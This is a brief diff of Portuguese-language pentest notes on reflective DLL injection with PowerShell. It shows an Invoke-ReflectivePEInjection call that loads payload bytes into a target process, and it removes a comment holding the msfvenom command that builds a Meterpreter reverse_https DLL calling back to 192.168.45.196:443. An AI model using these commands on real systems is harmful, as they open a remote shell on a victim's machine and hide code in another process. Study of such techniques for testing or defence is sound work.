@@ -26,7 +26,6 @@ Ao executar, a DLL é carregada na memória e o ShellCode de met.dll que foi ger
 ```powershell
 Import-Module .\Invoke-ReflectivePEInjection.ps1
 
-#feito com msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.196 LPORT=443 -f dll -o met.dll
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
 ```
 
